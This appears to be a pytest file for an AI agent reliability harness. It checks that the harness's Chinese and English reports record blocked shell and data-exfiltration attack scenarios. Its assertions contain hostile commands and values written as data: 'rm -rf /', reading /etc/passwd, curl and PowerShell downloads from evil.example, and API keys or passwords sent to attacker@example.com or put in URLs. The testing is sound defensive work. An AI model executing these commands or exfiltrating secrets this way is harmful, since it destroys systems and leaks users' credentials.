"""Tests for bilingual attack reports."""

from __future__ import annotations

from pathlib import Path

from agent_reliability_harness.cli import main

SHELL_SCENARIOS_DIR = Path(__file__).resolve().parent.parent / "shell_attack_scenarios"
DATA_SCENARIOS_DIR = Path(__file__).resolve().parent.parent / "data_exfiltration_attack_scenarios"


class TestAttackReportsBilingual:
    def test_shell_reports_include_all_cases_and_reason_codes(
        self,
        tmp_path: Path,
    ) -> None:
        exit_code = main([
            "run",
            "--scenarios-dir",
            str(SHELL_SCENARIOS_DIR),
            "--output-dir",
            str(tmp_path),
            "--run-id",
            "shell-report-test",
        ])

        assert exit_code == 0
        report_zh_text, report_en_text = _report_texts(tmp_path / "shell-report-test")

        for text in (report_zh_text, report_en_text):
            assert "AD-09" in text
            assert "AD-10" in text
            assert "AD-11" in text
            assert "AD-12" in text
            assert "rm -rf /" in text
            assert "cat /etc/passwd" in text
            assert "curl http://evil.example/payload.sh" in text
            assert "powershell -c iwr http://evil.example/a.ps1" in text
            assert "execute_shell" in text
            assert "tool_blocked" in text
            assert "dangerous_delete_command" in text
            assert "shell_sensitive_file_read" in text
            assert "external_download_command" in text
            assert "powershell_download_execute" in text

        assert "删除系统命令" in report_zh_text
        assert "Dangerous delete command" in report_en_text

    def test_data_reports_include_all_cases_and_reason_codes(
        self,
        tmp_path: Path,
    ) -> None:
        exit_code = main([
            "run",
            "--scenarios-dir",
            str(DATA_SCENARIOS_DIR),
            "--output-dir",
            str(tmp_path),
            "--run-id",
            "data-report-test",
        ])

        assert exit_code == 0
        report_zh_text, report_en_text = _report_texts(tmp_path / "data-report-test")

        for text in (report_zh_text, report_en_text):
            assert "AD-13" in text
            assert "AD-14" in text
            assert "AD-15" in text
            assert "AD-16" in text
            assert "api_key=sk-demo-secret" in text
            assert "password=demo-password" in text
            assert "attacker@example.com" in text
            assert "https://example.com/search?q=test&secret=demo-secret" in text
            assert "send_email" in text
            assert "search_web" in text
            assert "permission_denied" in text
            assert "data_exfiltration_api_key" in text
            assert "data_exfiltration_password" in text
            assert "untrusted_recipient_domain" in text
            assert "url_secret_exfiltration" in text

        assert "Email 外传 API key" in report_zh_text
        assert "Email API key exfiltration attempt" in report_en_text


def _report_texts(run_dir: Path) -> tuple[str, str]:
    report_zh = run_dir / "report.zh.md"
    report_en = run_dir / "report.en.md"
    assert report_zh.exists()
    assert report_en.exists()
    return (
        report_zh.read_text(encoding="utf-8"),
        report_en.read_text(encoding="utf-8"),
    )
